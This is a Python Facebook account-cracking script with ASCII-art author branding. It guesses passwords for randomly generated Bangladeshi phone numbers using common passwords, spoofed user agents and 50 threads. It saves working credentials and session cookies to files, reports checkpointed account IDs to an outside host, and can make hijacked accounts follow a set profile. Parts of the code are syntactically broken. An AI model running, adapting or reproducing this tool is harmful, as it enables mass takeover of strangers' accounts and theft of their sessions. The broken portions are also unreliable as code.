#Edit BY Emran
#Fuck By Hasan
#open sourse By Hasan


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""

  \033[38;5;46m╔═════════════════════════════════════╗
  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔═══════════╗ \x1b[38;5;196m╔════════╗ ║
  \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m███    ███ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
  \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m████  ████ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
  \033[38;5;46m║ ║\033[38;5;46m█████   ║ \033[38;5;46m║\x1b[38;5;196m██ ████ ██ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
  \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m██  ██  ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
  \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m██      ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚═══════════╝ \033[38;5;46m╚════════╝ ║
  \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔══════════╗             ║
  \033[38;5;46m║ ║ \033[37;1m█████  ║ \033[38;5;46m║\033[38;5;46m███    ██ ║     ࿇⃝🌹⃢𝐄⃢🌹⃝࿇ ║
  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m████   ██ ║     ࿇⃝🌹⃢𝐌⃢🌹⃝࿇ ║
  \033[38;5;46m║ ║\033[37;1m███████ ║ \033[38;5;46m║\033[38;5;46m██ ██  ██ ║     ࿇⃝🌹⃢𝐑⃢🌹⃝࿇ ║
  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m██  ██ ██ ║     ࿇⃝🌹⃢𝐀⃢🌹⃝࿇ ║
  \033[38;5;46m║ ║\033[37;1m██   ██ ║ \033[38;5;46m║\033[38;5;46m██   ████ ║     ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ ║
  \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚══════════╝             ║ 
  \033[38;5;46m╚═════════════════════════════════════╝                                                 
\x1b[38;5;196m╔═════════════╗  ࿇⃝🌹⃢𝐄⃢🌹⃝࿇  \033[38;5;46m╔══════════════════╗
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  ࿇⃝🌹⃢𝐌⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐄𝐌𝐑𝐀𝐍             ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  ࿇⃝🌹⃢𝐑⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐌𝐑𝐀𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍      ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  ࿇⃝🌹⃢𝐀⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝐄𝐌𝐑𝐀𝐍 𝐂𝐘𝐁𝐄𝐑 𝟗𝟗𝟒𝟖𝟕 ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 ║  ࿇⃝🌹⃢𝐊⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟗𝟓𝟒𝟗𝟖𝟓𝟕     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐈𝐌𝐎      ║  ࿇⃝🌹⃢𝐈⃢🌹⃝࿇  \033[38;5;46m║\033[38;5;46m𝟗𝟕𝟏𝟎𝟓𝟔𝟒𝟑𝟓𝟑𝟗𝟑𝟑     ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐑𝐎𝐌     ║  ࿇⃝🌹⃢𝐍⃢🌹⃝࿇ \033[38;5;46m ║\033[38;5;46m𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄𝐒𝐇        ║
\x1b[38;5;196m╚═════════════╝  ࿇⃝🌹⃢𝐆⃢🌹⃝࿇  \033[38;5;46m╚══════════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ua = 'Dalvik/2.1.0 (Linux; U; Android 1; CPH65673X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9699.0.0.808.9[FBAN/FB4A;FBAV/1779.0.0.88.96;[FBAN/FB4A;FBAV/9706.0.0.88.96;[FBAN/FB4A;FBAV/7398.0.0.88.96;FBBV/426492151;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/CPH65673X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=3045,height=7743};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 11; CPH69419g Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3006.0.0.808.9[FBAN/FB4A;FBAV/4762.0.0.88.96;[FBAN/FB4A;FBAV/183.0.0.88.96;[FBAN/FB4A;FBAV/6312.0.0.88.96;FBBV/5326933385;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/CPH69419g;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1162,height=2322};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 3; RMX87475l Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9952.0.0.808.9[FBAN/FB4A;FBAV/3143.0.0.88.96;[FBAN/FB4A;FBAV/1701.0.0.88.96;[FBAN/FB4A;FBAV/8523.0.0.88.96;FBBV/3527577794;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX87475l;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2888,height=4755};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; RMX3317F Build/OPM4.579514.034) [FBAN/FB4A;FBAV/1151.0.0.808.9[FBAN/FB4A;FBAV/5421.0.0.88.96;[FBAN/FB4A;FBAV/1040.0.0.88.96;[FBAN/FB4A;FBAV/9229.0.0.88.96;FBBV/62779724758;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX3317F;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2206,height=7276};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX11480n Build/OPM4.579514.034) [FBAN/FB4A;FBAV/3146.0.0.808.9[FBAN/FB4A;FBAV/2806.0.0.88.96;[FBAN/FB4A;FBAV/308.0.0.88.96;[FBAN/FB4A;FBAV/6587.0.0.88.96;FBBV/52811016876;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX11480n;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=706,height=1174};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 13; moto g15136v Build/OPM4.579514.034) [FBAN/FB4A;FBAV/7453.0.0.808.9[FBAN/FB4A;FBAV/6167.0.0.88.96;[FBAN/FB4A;FBAV/2162.0.0.88.96;[FBAN/FB4A;FBAV/7371.0.0.88.96;FBBV/48357446201;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/moto g15136v;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2753,height=1041};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 2; RMX22952Z Build/OPM4.579514.034) [FBAN/FB4A;FBAV/9723.0.0.808.9[FBAN/FB4A;FBAV/2927.0.0.88.96;[FBAN/FB4A;FBAV/5285.0.0.88.96;[FBAN/FB4A;FBAV/5859.0.0.88.96;FBBV/1419235172;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX22952Z;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=449,height=4631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 17; GT-15453y Build/OPM4.579514.034) [FBAN/FB4A;FBAV/8548.0.0.808.9[FBAN/FB4A;FBAV/9326.0.0.88.96;[FBAN/FB4A;FBAV/8279.0.0.88.96;[FBAN/FB4A;FBAV/4087.0.0.88.96;FBBV/50084369326;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/GT-15453y;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2650,height=1923};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; RMX24382h Build/OPM4.579514.034) [FBAN/FB4A;FBAV/535.0.0.808.96[FBAN/FB4A;FBAV/7101.0.0.88.96;[FBAN/FB4A;FBAV/5435.0.0.88.96;[FBAN/FB4A;FBAV/5124.0.0.88.96;FBBV/19053648879;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/RMX24382h;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2538,height=4864};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 15; GT-49806X Build/OPM4.579514.034) [FBAN/FB4A;FBAV/5535.0.0.808.9[FBAN/FB4A;FBAV/8838.0.0.88.96;[FBAN/FB4A;FBAV/1025.0.0.88.96;[FBAN/FB4A;FBAV/8398.0.0.88.96;FBBV/77025542825;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/GT-49806X;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=2941,height=7198};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 18; SC-99359f Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4221.0.0.808.9[FBAN/FB4A;FBAV/6577.0.0.88.96;[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/7914.0.0.88.96;FBBV/36318278322;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/SC-99359f;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1637,height=1739};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi 14099w Build/OPM4.579514.034) [FBAN/FB4A;FBAV/4743.0.0.808.9[FBAN/FB4A;FBAV/7360.0.0.88.96;[FBAN/FB4A;FBAV/628.0.0.88.96;[FBAN/FB4A;FBAV/4448.0.0.88.96;FBBV/17141943492;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/Redmi 14099w;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=4213,height=3631};FB_FW/1;]'
ua = 'Dalvik/2.1.0 (Linux; U; Android 5; SC-76753r Build/OPM4.579514.034) [FBAN/FB4A;FBAV/589.0.0.808.96[FBAN/FB4A;FBAV/9352.0.0.88.96;[FBAN/FB4A;FBAV/4379.0.0.88.96;[FBAN/FB4A;FBAV/8738.0.0.88.96;FBBV/22243748677;FBRV/0;FBPN/com.facebook.katana;FBLC/fi_PK;FBMF/Oppo;FBBD/Apple;FBDV/SC-76753r;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=322,height=5573};FB_FW/1;]'
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
#-------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')

# APK CHECK
def xxr():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,92302,92301,91778{x}')
    print(" \033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××")
    rk1 = '0171'
    rk2 = '0172'
    rk3 = '0175'
    code = random.choice([rk1,rk2,rk3])                      
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    limit = int(input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m EXAMPLE : 2000, 3000, 5000 \n \033[1;93m××××××××××××××××××××××××××××××××××××××××××××××××× \n \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = 0
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input(f"\033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOTAL IDS: {xr}'+tl)
        print(f'{x} \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m THE PROCESS HAS BEEN STARTED')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96mASRAFUL ISLAM HASAN')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m USE NETWORK  \033[1;97m:  \033[1;96m2G, 3G, 4G, 5G ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print(f" \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
        for love in user:
            pwx = [love[1:]]
            uid = code+love,'bangladesh','sadiya','hridoy','sahin','nusrat','fatema','sabbir','mababa','708090','908070','free fire','freefire1234'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××")
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
            'dpr': '2',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"TECNO KE7"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro,
            'viewport-width': '980',}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m [EMRAN-OK💉] ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/EMRAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
                if 'LOCK' in res:
                    return 'LOCK'
                else:
                ##print('\r\r\33[1;31m [HASAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/HASAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}EMRAN-CYBER {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

xxr()
